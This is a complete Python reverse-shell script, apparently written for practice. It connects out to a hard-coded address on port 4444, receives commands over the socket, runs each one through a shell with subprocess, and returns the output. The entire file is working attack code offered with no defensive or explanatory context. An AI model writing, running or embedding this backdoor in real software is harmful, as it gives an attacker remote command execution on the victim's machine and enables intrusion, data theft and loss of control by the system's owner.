from socket import SOCK_STREAM, socket
import socket
import subprocess

#takes preliminary commands and saves there output
def exec_cmd(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, SOCK_STREAM)
connection.connect(("192.168.124.132", 4444))
# connection.send("\n[+]Connection Established\n")

#keeps on recieving commands to check output for                            
while True:
    cmd = connection.recv(1024)
    print(type(cmd))
    print(cmd)
    result = exec_cmd(cmd)
    connection.send(result)

connection.close()